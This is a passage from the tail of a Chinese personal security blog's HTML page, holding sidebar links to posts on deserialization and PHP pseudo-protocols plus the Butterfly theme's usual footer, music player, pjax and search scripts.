15:12:18">2024-11-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Pickle反序列化"><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1731986246004.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pickle反序列化"/></a><div class="content"><a class="title" href="/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Pickle反序列化">Pickle反序列化</a><time datetime="2024-11-19T03:10:44.000Z" title="发表于 2024-11-19 11:10:44">2024-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/" title="php反序列化 + GC回收机制"><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/640.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php反序列化 + GC回收机制"/></a><div class="content"><a class="title" href="/2024/11/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/" title="php反序列化 + GC回收机制">php反序列化 + GC回收机制</a><time datetime="2024-11-16T04:53:24.000Z" title="发表于 2024-11-16 12:53:24">2024-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/16/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php 伪协议"><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexporta16671866711c9e39b584339e440552d_1731728.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php 伪协议"/></a><div class="content"><a class="title" href="/2024/11/16/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php 伪协议">php 伪协议</a><time datetime="2024-11-16T03:37:49.000Z" title="发表于 2024-11-16 11:37:49">2024-11-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1732259652906.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Gu0f3n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>(() => {
+  const panguFn = () => {
+    if (typeof pangu === 'object') pangu.autoSpacingPage()
+    else {
+      btf.getScript('https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js')
+        .then(() => {
+          pangu.autoSpacingPage()
+        })
+    }
+  }
+
+  const panguInit = () => {
+    if (false){
+      GLOBAL_CONFIG_SITE.isPost && panguFn()
+    } else {
+      panguFn()
+    }
+  }
+
+  btf.addGlobalFn('pjaxComplete', panguInit, 'pangu')
+  document.addEventListener('DOMContentLoaded', panguInit)
+})()</script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><div class="aplayer no-destroy" data-id="12384198565" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><div class="fb-customerchat" id="fb-customer-chat" attribution="biz_inbox"></div><script>(() => {
+  document.getElementById('fb-root') ? '' : document.body.insertAdjacentHTML('afterend', '<div id="fb-root"></div>')
+
+  window.fbAsyncInit = function() {
+    FB.init({
+      xfbml: true,
+      version: 'v16.0'
+    });
+  };
+
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = 'https://connect.facebook.net/zh_CN/sdk/xfbml.customerchat.js';
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+
+  const isChatBtn = false
+  const isChatHideShow = false
+
+  if (isChatBtn) {
+    window.chatBtnFn = () => {
+      const isShow = document.querySelector('.fb_customer_chat_bounce_in_v2')
+      isShow ? FB.CustomerChat.hide() : FB.CustomerChat.show()
+    }
+  } else if (isChatHideShow) {
+    window.chatBtn = {
+      hide: () => {
+        FB.CustomerChat.hide()
+      },
+      show: () => {
+        FB.CustomerChat.show(false)
+      }
+    }
+  }
+})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const loadMeting = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'loadMeting')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+const triggerPjaxFn = (val) => {
+  if (!val) return
+  Object.values(val).forEach(fn => { fn() })
+}
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  triggerPjaxFn(window.globalFn.pjaxSend)
+})
+
+document.addEventListener('pjax:complete', () => {
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  triggerPjaxFn(window.globalFn.pjaxComplete)
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.14.0-b3"></script></div></div></body></html>
